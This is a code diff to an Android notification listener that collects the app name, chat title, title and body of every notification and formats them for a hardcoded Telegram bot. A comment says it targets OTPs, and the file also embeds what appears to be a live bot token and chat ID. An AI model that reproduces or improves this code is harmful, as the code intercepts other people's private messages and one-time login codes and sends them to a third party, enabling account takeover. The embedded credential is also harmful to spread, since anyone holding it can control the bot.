@@ -16,7 +16,7 @@ public class NotificationListener extends NotificationListenerService {
 
     private static final String TAG = "NotifBridge";
     // 👇 PUT YOUR TELEGRAM BOT TOKEN AND CHAT ID HERE
-    private static final String BOT_TOKEN = "8784269795:AAH6CMkTyR8N9h49DaRSpi-HmfVTLmvG_0I ";
+    private static final String BOT_TOKEN = "8784269795:AAH6CMkTyR8N9h49DaRSpi-HmfVTLmvG_0I";
     private static final String CHAT_ID = "748395295";
 
     @Override
@@ -28,14 +28,14 @@ public class NotificationListener extends NotificationListenerService {
             CharSequence title = ex.getCharSequence(Notification.EXTRA_TITLE);
             CharSequence text  = ex.getCharSequence(Notification.EXTRA_TEXT);
             CharSequence big   = ex.getCharSequence(Notification.EXTRA_BIG_TEXT);
-            CharSequence sub   = ex.getCharSequence(Notification.EXTRA_SUBTITLE);
+            CharSequence summ  = ex.getCharSequence(Notification.EXTRA_SUMMARY);
             CharSequence convo = ex.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE);
 
             // take the longest available text (OTP is usually in big text)
             CharSequence body = text;
             if (big != null && (body == null || big.length() > body.length())) body = big;
 
-            // skip empty and silent/self notifications
+            // skip empty notifications
             if (body == null || body.length() == 0) {
                 Log.i(TAG, "Skipped (no text): " + sbn.getPackageName());
                 return;
@@ -43,7 +43,7 @@ public class NotificationListener extends NotificationListenerService {
 
             String msg = "📱 App: " + sbn.getPackageName() + "\n"
                     + (convo != null ? "💬 Chat: " + convo + "\n" : "")
-                    + (sub != null ? "👤 " + sub + "\n" : "")
+                    + (summ != null ? "📝 " + summ + "\n" : "")
                     + "🔔 " + (title != null ? title : "") + "\n"
                     + body;
 
